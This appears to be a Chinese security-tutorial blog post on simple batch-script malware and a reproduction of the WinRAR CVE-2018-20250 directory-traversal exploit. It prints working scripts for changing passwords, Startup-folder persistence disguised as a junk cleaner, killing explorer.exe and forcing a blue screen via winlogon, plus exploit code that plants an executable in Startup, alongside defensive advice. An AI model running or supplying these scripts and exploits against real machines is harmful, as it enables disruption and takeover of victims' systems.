> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/zJu24EKewJmwQnd37Erf0Q)

作者前文介绍了 Windows PE 病毒， 包括 PE 病毒原理、分类及感染方式详解；这篇文章将讲解简单的病毒原理和防御知识，并通过批处理代码和漏洞（CVE-2018-20250）利用让大家感受下病毒攻击的过程，包括自动启、修改密码、定时关机、蓝屏、进程关闭等功能，同时提出了安全相关建议。这些基础性知识不仅和系统安全相关，同样与我们身边常用的软件、操作系统紧密联系，希望这些知识对您有所帮助，更希望大家提高安全意识，安全保障任重道远。本文参考了参考文献中的文章（尤其感谢千峰教育史密斯老师 [峰哥]），并结合自己的经验和实践进行撰写，也推荐大家阅读参考文献。

文章目录：

*   **一. 批处理病毒机理**
    
    1. 关机 bat 脚本
    
    2. 修改密码和定时关机脚本
    
    3. 脚本病毒防御
    
*   **二. 自启动恶意攻击机理**
    
    1.bat 脚本实现自启动
    
    2.WinRAR 恶意劫持自启动（CVE-2018-20250）
    
    3. 恶意自启动防御
    
*   **三. 进程关闭脚本**
    
*   **四. 蓝屏攻击机理**
    
    1.bat 脚本实现蓝屏攻击
    
    2. 最新漏洞 Chrome 致 Win10 蓝屏复现
    
    3. 关键技术
    
*   **五. 简单的扩展名修改恶意攻击**
    

> 从 2019 年 7 月开始，我来到了一个陌生的专业——网络空间安全。初入安全领域，是非常痛苦和难受的，要学的东西太多、涉及面太广，但好在自己通过分享 100 篇 “网络安全自学” 系列文章，艰难前行着。感恩这一年相识、相知、相趣的安全大佬和朋友们，如果写得不好或不足之处，还请大家海涵！  
> 接下来我将开启新的安全系列，叫 “系统安全”，也是免费的 100 篇文章，作者将更加深入的去研究恶意样本分析、逆向分析、内网渗透、网络攻防实战等，也将通过在线笔记和实践操作的形式分享与博友们学习，希望能与您一起进步，加油~
> 
> 推荐前文：网络安全自学篇系列 - 100 篇
> 
> https://blog.csdn.net/eastmount/category_9183790.htm

作者的 github 资源：  

*   逆向分析：https://github.com/eastmountyxz/
    
    SystemSecurity-ReverseAnalysis
    
*   网络安全：https://github.com/eastmountyxz/
    
    NetworkSecuritySelf-study
    

> 声明：本人坚决反对利用教学方法进行犯罪的行为，一切犯罪行为必将受到严惩，绿色网络需要我们共同维护，更推荐大家了解它们背后的原理，更好地进行防护。该样本不会分享给大家，分析工具会分享。（参考文献见后）

一. 批处理病毒机理
==========

计算机病毒（Computer Virus）是编制者在计算机程序中插入的破坏计算机功能或者数据的代码，能影响计算机使用，能自我复制的一组计算机指令或者程序代码。计算机病毒具有传播性、隐蔽性、感染性、潜伏性、可激发性、表现性或破坏性。计算机病毒的生命周期：

*   开发期→传染期→潜伏期→发作期→发现期→消化期→消亡期
    

计算机病毒是一个程序，一段可执行码。就像生物病毒一样，具有自我繁殖、互相传染以及激活再生等生物病毒特征。计算机病毒有独特的复制能力，它们能够快速蔓延，又常常难以根除。它们能把自身附着在各种类型的文件上，当文件被复制或从一个用户传送到另一个用户时，它们就随同文件一起蔓延开来。常见病毒如 “爱虫” 病毒、CIH 病毒、木马病毒（Trojan）、脚本病毒、宏病毒等等。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTKopPsCeYLUKibbdAeiaMxDUwb8ibdVib2jkkSQUZgiaEbXIXR1oEGqFSzDw/640?wx_fmt=png)

本文首先通过批处理 bat 文件模拟简单的病毒功能，让大家简单感受下病毒的某些功能。包括：

*   自动关机
    
*   修改密码
    
*   定时关机  
    

bat 文件是 dos 下的批处理文件。批处理文件是无格式的文本文件，它包含一条或多条命令。它的文件扩展名为 .bat 或 .cmd。在命令提示下输入批处理文件的名称，或者双击该批处理文件，系统就会调用 cmd.exe 按照该文件中各个命令出现的顺序来逐个运行它们。使用批处理文件或脚本，可以简化日常或重复性任务。入侵者常常通过批处理文件的编写来实现多工具的组合入侵、自动入侵及结果提取等功能.

> 注意：再次强调，本文仅仅是普及安全知识和病毒背后的机理，让大家更好进行防御工作。如果需要复现样本，一定在自己的虚拟机中完成，一切犯罪行为必将受到严惩。

1. 关机 bat 脚本
------------

下面讲解第一个批处理脚本，主要是调用 “shutdown” 实现关机。该批处理脚本能让我们最快的熟悉脚本的恶意功能，其基本步骤如下：

*   新建文本文档
    
*   输入 shutdown -s -t 600
    
*   把 txt 改成 bat
    

如下图所示，运行 CMD 可以查看 shutdown 命令的基本用法。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTSib4ibeHgkZEficcEmvO6dYggFm1cPMD6egvQbibb4cMxTxfccQGyib6hZg/640?wx_fmt=png)

基本命令为：

```
shutdown -s -t 600//现在让系统600秒之后关机shutdown -a//终止关闭计算机
```

运行结果如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTqTnAnac2nH0EZt1cHmleM8iahicMVlhahO6YWIF6tWT6nAuY8LjFW1YQ/640?wx_fmt=png)

新建 “test.bat” 并填写“shutdown -s -t 600”，某些系统需要在 “文件夹选项” 中，显示“隐藏已知文件类型的扩展名”。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aT0gRYaFzFnXEVErzn0vicNkdiahQ6e3eTBQj2JZOlyJhedsMbLCSPo3Ww/640?wx_fmt=png)

双击 BAT 文件即运行关机，如果需要取消，还是在 CMD 黑框中输入 “shutdown -a” 命令。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTiaBgpv4MuGSP6oicoYL0wMICkLoUCyVyEKf9V0IYgyBWvHlDx8LBCVYA/640?wx_fmt=png)

2. 修改密码和定时关机脚本
--------------

接下来分享一个比较完整的 bat 脚本制作过程，这些代码对批处理功能熟悉和脚本病毒逆向分析都有帮助。

第一步，新建 game.bat 文件。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTf98Mqs1wVpqyfyre8YAM8iamZvicT1fiaBC8YRa1hyece8PlH3Ny2N8BA/640?wx_fmt=png)

程序编写如下所示，其中 “@echo off” 表示关闭回显，“color 0a” 表示设置颜色。

```
@echo offcolor 0atitle Eastmount程序echo ===================================echo                 菜单echo           1.修改管理员密码echo           2.定时关机echo           3.退出本程序echo ===================================pause
```

运行结果如下图所示，可以看到标题为 “Eastmount 程序”，并且包含相关内容，这就是批处理文件执行过程。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTju5g6bzJiaZaoyUibgfL11vSAiagoEEaZ3yPHLmFly6IpbSlTthAX1OGA/640?wx_fmt=png)

第二步，做一个选择判断，该程序需要和用户进行互动。  
核心代码为 “set /p num = 您的选择是：”，其表示设置变量 num，“/p” 表示暂停并等待用户输入，用户最终输入的值赋为 num。

```
@echo offcolor 0atitle Eastmount程序echo ===================================echo                 菜单echo           1.修改管理员密码echo           2.定时关机echo           3.退出本程序echo ===================================set /p num=您的选择是：pause
```

输出结果如下图所示：  
![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTYZAic9qbOXWk4aV7ad83LARDhSJ4ibaT3unCYicLb5gt0jk4Da8yIXQrQ/640?wx_fmt=png)

第三步，补充修改管理员密码、定时关机、退出等命令（病毒常用功能）。  
修改管理员密码的命令是微软所有系统的通用命令，下述代码是修改当前管理员密码为 “123456”。

*   net user administrator 123456
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTan9OjJ19gYngoq81maljU3HFRF1RkUqYcGH47B75xlD3hEnCiaOhcSQ/640?wx_fmt=png)

第二个选项是关机，命令如下：

*   shutdown -s -t 100
    

第三个选项是退出本程序。

*   exit
    

接着编写判断和跳转批处理代码，代码如下所示，“>nul” 表示不输出运行提示信息。虽然 goto 语句不提倡使用，但某些情况下还是挺便捷的。

```
@echo offcolor 0atitle Eastmount程序:menuecho ===================================echo                 菜单echo           1.修改管理员密码echo           2.定时关机echo           3.退出本程序echo ===================================set /p num=您的选择是：if "%num%"=="1" goto 1if "%num%"=="2" goto 2if "%num%"=="3" goto 3:1net user administrator 123456 > nulecho 您的密码已经设置成功！pausegoto menu:2shutdown -s -t 100goto menu:3exit
```

此时输入 “1” 会提示系统错误，如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTXAp5Pty1acEf1TuktdxeVQYdBEqY3lWGoicGywqtpibNzpGv0rSplmXQ/640?wx_fmt=png)

同时，杀毒软件也会提示黑客修改电脑，点击 “允许操作” 即可，

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTTWnsAcYJLTRfHkc5dOpibCWHq5agJCpGicjPicwyU0NCbpKjkjTHSicCpA/640?wx_fmt=png)

继续完善脚本：

*   增加 “cls” 命令清屏
    
*   为了避免输入数字 “4” 会从头执行到尾，补充一个提示信息
    
*   最后补充设置的用户名和新密码，关机时间等
    

```
@echo offcolor 0atitle Eastmount程序:menuclsecho ===================================echo                 菜单echo           1.修改管理员密码echo           2.定时关机echo           3.退出本程序echo ===================================set /p num=您的选择是：if "%num%"=="1" goto 1if "%num%"=="2" goto 2if "%num%"=="3" goto 3echo 您好！请输入1-3正确的数字pausegoto menu:1set /p u=请输入用户名:set /p p=请输入新密码:net user %u% %p% >nulecho 您的密码已经设置成功！pausegoto menu:2set /p time=请输入时间:shutdown -s -t %time%goto menu:3exit
```

以 “管理员身份运行” 后，成功修改 “xxxxx” 用户的开机密码为“12345”。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTOzWshyraPmmN7xjtpRro1bKVYXj52a9LOkjHn1XP1MAwU5qhaDBw5Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTnNiap4mwicgfUkEo5dTVMk9QNNia1O7tCy5iaSCwzONrMc68Uia8lAuYH5A/640?wx_fmt=png)

输入 2 可以设置关机时间，这里就不再赘述，批处理脚本实现某些恶意功能的过程已经详细讲解。

3. 脚本病毒防御
---------

上面主要介绍了批处理 bat 脚本实现关机和修改管理员密码的功能。但在真正的网络攻防过程中，脚本病毒和宏病毒更常见，这里分享下它们的防御方法。

脚本病毒是主要采用脚本语言设计的计算机病毒。现在流行的脚本病毒大都是利用 JavaScript 和 VBScript 脚本语言编写。实际上在早期的系统中，病毒就己经开始利用脚本进行传播和破坏，不过专门的脚本型病毒并不常见。但是在脚本应用无所不在的今天，脚本病毒却成为危害大、传播广的病毒，特别是当它们和一些传统的进行恶性破坏的病毒如 CIH 相结合时其危害就更为严重了。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTPzzEVKic18ntcSdP05xdIsbbQVRqe4b1x49QE4DukUuYaJSgZyfLTBw/640?wx_fmt=png)

随着计算机系统软件技术的发展，新的病毒技术也应运而生，特别是结合脚本技术的病毒更让人防不胜防，比如在 APT 中鱼叉式钓鱼邮件结合宏病毒（Office 文档）就很常见。由于脚本语言的易用性，并且脚本在现有应用系统中特别是 Internet 应用中占据了重要地位，脚本病毒也成为互联网病毒中最为流行的网络病毒之一。常见脚本文件后缀：

*   .VBS、.VBE、.JS、.BAT、.CMD
    

常见的防御措施包括：

*   防范 VBS（Visual Basic Script）脚本病毒，比如禁用文件系统对象 regsvr32 scrrun.dll/u
    
*   在浏览器设置中将 ActiveX 插件和控件以及 JS 相关功能禁止掉，这样可以避免一些恶意代码的攻击，不过也会限制一些制作精美的动态网页
    
*   及时升级系统和浏览器补丁，选择一款好的防病毒软件并做好及时升级
    
*   防止鱼叉式钓鱼邮件攻击，不要轻易去浏览或点击一些来历不明的网站、邮件、文件，这样大部分的恶意代码都会被我们拒之 “机” 外
    
*   小心处理 Office 文档，除非确认文档来源可靠，充分了解打开文档的后果，否则务必不要开启 Office 启用宏代码
    
*   使用云沙箱和本地安全软件对可疑文件进行检测
    
*   提升安全意识，尤其内部人员的安全意识
    

二. 自启动恶意攻击机理
============

上一篇文章我们介绍了 PE 病毒控制权获取的常用方法，当计算机重启后，病毒自启动是一个重要的功能。常用方法包括：

*   病毒融合 Autoruns 自启动机制
    
    下图展示了 Autoruns 软件查看 Windows 操作系统的自启动选项，如果病毒本身能很好地结合这套机制，它可以做的事情非常多，并且具有很好的隐蔽性。
    
*   利用系统自动播放机制 Autorun.inf
    
    比如 U 盘病毒或光盘病毒就是利用 U 盘或光盘的自动播放功能。目前，也有一些 U 盘插入之后，不需要你去双击这个 U 盘，里面的程序就会自启动。
    
*   在其他可执行文件嵌入少量触发代码
    
    修改引入函数节启动 DLL 病毒文件（添加相应结构，初始化代码触发），在特定 PE 文件代码段插入触发代码等（只需定位可执行程序并运行）。
    
*   DLL 劫持：替换已有 DLL 文件
    
    很多应用程序或操作系统执行时，都会去执行 DLL 文件，如果病毒将自身做成一个 DLL 文件，同时将系统 DLL 文件替换。可想而知，系统启动时，它是根据文件名启动的，此时病毒 DLL 文件就会拿到控制权，如果拿到控制权之后再进一步装载原始 DLL 文件，这样系统的本身机制也不会受到影响，隐蔽性更强。该方法非常常见，甚至有一些病毒程序将反病毒软件可依赖的 DLL 文件替换。
    
*   利用 0day 或 1day 漏洞实现自启动，接着我们将详细介绍 WinRAR 恶意劫持漏洞，复现 CVE-2018-20250
    

注意，后续 Windows 黑客编程文章，作者也会详细介绍各种自启动的代码（C++\Python）实现方法。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aT8wp911OaicalZcTwoCgZGiaW6XAibErU3Wz2kEjactFDlcfp9gTicqpMJQ/640?wx_fmt=png)

1.bat 脚本实现自启动
-------------

接着编写一个伪装成 “系统垃圾清理” 的代码，它其实是一个导致系统死机的代码，也不能算是“病毒”，更多是一个恶作剧程序。但它能让我们了解脚本病毒的某些功能，其原理是不断打开 CMD 程序，占用系统资源从而导致死机，并且每次开机都会自动启。

> PS：这里强调一句，建议大家在虚拟机中运行该代码。我们作为安全工程师，希望您们去了解漏洞背后的原理，更好地进行防御，绿色网络需要我们共同维护，杜绝一切违法行为。

第一步，在 C:\windows 目录下创建文件 “windows.bat”。一个 “>” 表示覆盖文件内容，两个 “>>” 表示追加一句话至文件末尾。

*   echo start cmd >c:\windows\windows.bat
    
*   echo %0>>c:\windows\windows.bat
    

用户打开这个程序之后，程序就会不断打开 cmd，占用系统资源，导致系统瘫痪，%0 是再次执行该程序的意思。但是，这样只能让用户死机一次，重启系统以后，不再打开这个文件以后，就不再会中招了。

第二步，将这个恶意脚本放到开机菜单中，每次开机都自动启动运行并导致电脑死机。  
errorlevel 为预定义变量，随着系统变化而变化。如果为 0 表示上一条命令执行成功，如果非 0 表示上一条命令执行失败，它不是 Win7 系统，而执行下面这条命令（XP 系统、2003 系统）。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTPzSopUFHRicpVR9Z1rDuXYfwYjXdcX8cqLrYgUeOdk135HoBn8g50TA/640?wx_fmt=png)

代码 “echo.” 表示空行，比如代码：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTcibzLBJAQvscv5OKqzw1YBkAFR8vvYCMWCI5AKbAzqMDbeQIdZzCxBg/640?wx_fmt=png)

输出结果如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTfx9xY9K1ZXJP6aLnAjDiaicHnCAtYV8V522IFOLT4UENd8NLcDZWBiaVg/640?wx_fmt=png)

第三步，接着编写 next 区域代码，完整代码如下所示。

```
@echo offtitle 系统垃圾清理color 2fecho 	=====若有杀毒软件恶意拦截，请选择【允许程序的所有操作】====echo.echo.echo start cmd >c:\windows\windows.bat::echo %%0>>c:\windows\windows.batcopy c:\windows\windows.bat "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\">nulif %errorlevel%==0 goto nextcopy c:\windows\windows.bat "%USERPROFILE%\「开始」菜单\程序\启动\">nulif %errorlevel%==1 goto error:nextecho.echo.echo 	=====垃圾清理中，请不要关闭窗口=========echo.ping -n 5 127.0.0.1>nulecho.echo 	=====垃圾清理完毕,共清理垃圾500M=======echo.echo.echo 	=====建议立即重启电脑==========pause:errorecho.echo.echo 	======程序运行失败，请【使用管理员权限】重新运行！========echo.pause
```

注意，我注释了重复操作代码 “::echo %%0>>c:\windows\ windows.bat”，否则开机自启动很麻烦。接着运行代码，如下图所示，需要右键 “以管理员身份运行”。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTl8YP1NdyyovpHD6e3DAIiaqkrIbalgeth1NwqrCvLDXzdHdlME7qdEw/640?wx_fmt=png)

代码会在 C:\windwos 目录下创建批处理文件 “windows.bat”。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTnEEG7531F1k2iabBibvhVvG9V99JgQT3Shp96duMEftlKGDk8Dn2MyXA/640?wx_fmt=png)

同时，在我的 Win10 系统开机自动动目录下也有该文件。目录：

*   …\AppData\Roaming\Microsoft\Windows\Start Menu\ Programs\Startup\
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTYPaAQv121ic7fjOu9mtesapxiaWCPBleSicu1hfQNVhjVYVXRTu55rXtg/640?wx_fmt=png)

打开该文件可以看到写入的 “start cmd” 代码，表示打开 CMD。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTuMxrUrJa3Ss438uHhSicj2H7ibF8PHuOszUuCemoBD84MfB7HHDOl8ZQ/640?wx_fmt=png)

双击该 “windows.bat” 文件，运行结果如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTUa23eo2panD5M2DdlI0IqtvQMbYog5HWSowbXHDbCia9balibK8KgQ3Q/640?wx_fmt=png)

总结： 该部分编写了一个系统清理工具，其实是把这个 windows.bat 写到用户的开机自启动目录下，达到用户每次开机，都会运行该程序的目的，重复调用 CMD 占用资源。如果中了该病毒，用户可以使用 PE 到开启启动目录把 windows.bat 文件删除，或者重装系统，再次建议大家别让它重复运行。

2.WinRAR 恶意劫持自启动
----------------

WinRAR 漏洞（CVE-2018-20250）是 Check Point 团队于 2019 年 2 月爆出的严重安全漏洞，该漏洞已存在于 WinRAR 中 19 年，是 APT 攻击中非常经典的漏洞。由于 WinRAR 使用了一个陈旧的 UNACEV2.dll 动态链接库造成的。当我们解压任意 ACE 文件时，由于没有对文件名进行充分过滤，导致其可实现目录穿越，将恶意软件写入操作系统启动 Startup 文件夹，并且电脑重启时会自动运行该程序，从而造成恶意软件劫持。通过该漏洞可以获得受害者计算机的控制。安全专家表示全球有超过 5 亿用户受到 WinRAR 漏洞影响。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aT5eUkksaMMf0dyXRa491TwhCXMODvn1RO4S32C7poCibic3KFQROkNeXg/640?wx_fmt=png)

下面我们先来复现该漏洞。该漏洞会对多种压缩软件造成影响，版本如下：

*   WinRAR < 5.70 Beta 1
    
*   Bandizip < = 6.2.0.0
    
*   好压 (2345 压缩) < = 5.9.8.10907
    
*   360 压缩 < = 4.0.0.1170
    

第一步，安装 WinRAR 5.6.1 的版本，后续 5.7 升级弥补了该漏洞。作者的电脑是 Win10 操作系统。

![](https://mmbiz.qpic.cn/mmbiz_jpg/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aT5s5CIoNwOF6TndoxQD9MndOicaZM7h6RlmRmcN7WEVOnoJE97Ybx9yQ/640?wx_fmt=jpeg)

安装之后可以看到本地存在的 UNACEV2.DLL 动态链接库，它就是被利用的入口。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTQsziaLaCVibDu9mIAvXy6BWT49FETicC1c6LvN3JEzqfofzvD7fiagaZvg/640?wx_fmt=png)

第二步，从 github 中下载漏洞利用程序，如下图所示。

*   hello.txt 和 world.txt 是需要压缩的文件
    
*   calc.exe 是计算器，可以替换成恶意软件，它会被定向植入系统启动目录
    
*   exp.py 是运行的 Python 代码，它会将 hello.txt 和 world.txt 压缩，并隐藏恶意软件
    
*   acefile.py 是利用 UNACEV2.DLL 漏洞的代码，共 4000 多行  
    https://github.com/backlion/CVE-2018-20250
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTF6stCkV4Ng8rFeTicFoFzYEJTG1CQDiavHlsgDWEG6RrZqlSNj2TVWiaw/640?wx_fmt=png)

我们尝试打开 exp.py 文件，代码如下，其中恶意软件为 “calc.exe”、压缩包名称为“test.rar”、需要压缩的文件为“hello.txt” 和“world.txt”、隐藏的路径为 Windows 系统开机启动的目录，并命名为“hi.exe”。读者也可以尝试修改名称，自定义需要压缩的文件及恶意软件。

```
#!/usr/bin/env python3import osimport reimport zlibimport binascii# The archive filename you wantrar_filename = "test.rar"# The evil file you want to runevil_filename = "calc.exe"# The decompression path you want, such shown belowtarget_filename = r"C:\C:C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hi.exe"# Other files to be displayed when the victim opens the winrar# filename_list=[]filename_list = ["hello.txt", "world.txt"]class AceCRC32:    def __init__(self, buf=b''):        self.__state = 0        if len(buf) > 0:            self += buf    def __iadd__(self, buf):        self.__state = zlib.crc32(buf, self.__state)        return self.... if __name__ == '__main__':    print("[*] Start to generate the archive file %s..."%(rar_filename))    shellcode_head = "6B2831000000902A2A4143452A2A141402001018564E974FF6AA00000000162A554E524547495354455245442056455253494F4E2A"    build_file(shellcode_head, rar_filename)    for i in range(len(filename_list)):        build_file_once(filename_list[i])    build_file_once(evil_filename, target_filename)    print("[+] Evil archive file %s generated successfully !"%(rar_filename))
```

第三步，打开 Python 运行 exp.py 代码，将自动生成 test.rar 压缩包。  
注意，如果未安装 Python 或相关包，需要进行安装。同时不能双击 exp.py，需要 Python 来运行代码。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTic0mKC27bmmnu2woFicQFcb66M5yMM9gMa8e0VMvQTCw6QAubj5WC8vQ/640?wx_fmt=png)

第四步，此时在当前文件夹生成了 test.rar 文件，将该压缩包发送给其他用户，如果目标电脑存在 WinRAR 漏洞，则会造成影响。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTb4pdkWyqBTFBFlgsQXsvbElCLgPQxwtBr4EMyiaJfw25sl0vnYyPB9Q/640?wx_fmt=png)

注意：QQ 和 Win10 防火墙已经能识别出该 CVE 漏洞号，如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aT57avnpZeeMMwTpuXh1kCJG0uN9CGSAK0LxH9nunQyHQ13VzIajNB7A/640?wx_fmt=png)

第五步，当目标用户在桌面解压该文件夹，则会在电脑启动目录放入我们的木马文件，命名为 “hi.exe”。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTYvZeH66cxlT4f8UCAMI4U9NDFuHYYBHmrHRszRNaHKVnRKhCBNP8Pg/640?wx_fmt=png)

Win10 路径：

*   C:\Users\xxxx\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTorVxgYTMBmqKnbf9XibppdrSIkUQXAwYAy9k1v3WHpsC8kOqkRrGOdQ/640?wx_fmt=png)

这里演示的是计算器，而如果植入恶意软件，则每次目标开机运行就会自启动该恶意代码。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTVMUkPAB6rVjnib0wgtVVI9hiaVtyPQlia6EOCdk1ljABZbIAgImlAiaNVA/640?wx_fmt=png)

注意：当目标用户解压我们文件时，其解压目录必须是 C:/users / 当前用户 / 目录下，也就是必须是在下面这些目录中解压的该文件。压缩包中隐藏了深层次的路径，xp 系统自启动路径可能不同。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTBE2SdMMib6p7BSoyI3UXBytUZFsX8ttzaheE5iaWo5RJicr3YngbNjoVw/640?wx_fmt=png)

3. 恶意自启动防御
----------

这里补充手动查杀病毒的基本流程，它在一定程度上能有效防止病毒的恶意功能。

*   排查可疑进程  
    因为病毒往往会创建出来一个或者多个进程，因此需要分辨出哪些进程是由病毒所创建，然后删除可疑进程。
    
*   检查启动项  
    病毒为了实现自启动，会采用一些方法将自己添加到启动项中，从而实现自启动，所以我们需要把启动项中的病毒清除。
    
*   删除病毒  
    在上一步的检查启动项中，我们就能够确定病毒主体的位置，这样就可以顺藤摸瓜，从根本上删除病毒文件。
    
*   修复被病毒破坏的文件  
    这一步一般来说无法直接通过纯手工完成，需利用相应的杀毒软件。
    

就自启动来说，我们首先需要检测启动项创建的位置及键值。如下图 “熊猫烧香” 病毒取消勾选 “spoclsv” 启动项，点击“确定”。

*   C:\WINDOWS\System32\drivers\spoclsv.exe
    
*   HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aThnMdMaF3KOv24W2JC0jEnx1ibNVCOwicc0coO8wpx4L5H9qWBkGN8LkQ/640?wx_fmt=png)

同时，打开注册表查看对应的值，发现创建了一个 svcshare 的值，它也是自启动对应 exe 程序。因此，需要删除注册表某些自启动键值。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aT85iaCYgicic1gKiac1cJIu5kibomiat6tL0JfpOYcYbG8o5I8SN4IY00cIVA/640?wx_fmt=png)

还有计划任务、系统服务、DLL 劫持、自动播放机制 Autorun.inf 都需要进行恶意自动启检查。比如在 Win10 自启动目录删除指定的恶意程序。

*   C:\Users\xxxx\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTorVxgYTMBmqKnbf9XibppdrSIkUQXAwYAy9k1v3WHpsC8kOqkRrGOdQ/640?wx_fmt=png)

三. 进程关闭脚本
=========

再看一个伪装的批处理代码。该命令执行杀死进程功能，“/im explorer.exe” 表示要杀死的进程名称，如关闭桌面；“/f” 表示强制杀死；“>nul” 表示在屏幕上不要输出任何信息。

*   taskkill /im explorer.exe /f >nul 2>nul
    

完整代码如下，其中 “Start c:\windows\ expolrer.exe” 表示继续开启桌面，“ping -n 5 127.0.0.1>nul”用于消耗时间。

```
@echo offtitle 系统垃圾清理color 2fecho 	=====若有杀毒软件恶意拦截，请选择【允许程序的所有操作】====echo.echo.echo.echo 	=====垃圾清理中，请不要关闭窗口=========echo.ping -n 5 127.0.0.1>nultaskkill /im explorer.exe /f >nul 2>nulecho.echo 	=====拐了，你的系统已经废了=======echo.ping -n 5 127.0.0.1>nulecho.Start c:\windows\explorer.exeecho.echo 	=====已经修复好！是不是吓坏了！！O(∩_∩)O==========pause
```

运行该批处理程序，桌面会消失，如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aT5x9QKjtdhJem6pRum3qmSRxBZNG6VyUsIOAs0rOmYsRjMLSwZlibmOw/640?wx_fmt=png)

过一会桌面又会恢复。由于作者桌面东西太乱，这里仅显示壁纸展示。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTBbmIAY61lPciaKFB9vgUJA9M7JvBRYOuPnnwV26Gm50eHfZFK1eibjGQ/640?wx_fmt=png)

四. 蓝屏攻击机理
=========

蓝屏死机称为 BSOD（Blue Screen of Death），也是常见的攻击行为，尤其是某些 CVE 漏洞复现过程，在进行提权尝试前都会先实现蓝屏攻击功能，其危害极大。

1.bat 脚本实现蓝屏攻击
--------------

基本步骤如下：

*   新建文本文档
    
*   输入：ntsd -c q -pn winlogon.exe，表示强制杀死进程
    
*   后缀 txt 修改为 bat
    
*   开始 -> 程序 -> 启动，打开 game.bat 文件
    

黑客很少攻击个人，一般攻击服务器，该命令对 2003 的服务器特别有杀伤力。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTsj29rbibspOhTnj7iaLWiaufAnyYhuKlryfosf5oVmvzkJ9TtmYlSyT1Q/640?wx_fmt=png)

双击之后，服务器直接蓝屏显示并重启。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRPv4HdVLBZ5IFnkjrvd90aTdSESD9BmiaWDLftBrYF8O6PJicQ9nlkyWRvWEHMNodoIDYsXebeBeSpw/640?wx_fmt=png)

